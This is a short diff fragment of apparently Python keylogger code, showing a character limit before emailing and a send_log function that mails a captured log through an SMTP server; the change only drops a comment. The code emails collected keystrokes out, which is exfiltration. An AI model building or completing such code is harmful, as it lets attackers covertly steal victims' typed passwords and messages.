@@ -15,7 +15,7 @@ word = ""  ###Setting variables
 email_char_limit = 75  ###Character limit before sending email
 
 
-def send_log():  ###Function because lazy. Sends enauk
+def send_log():  
     server.sendmail(email, email, log)
     ###Server, send email to email variable from email variable containing log
 
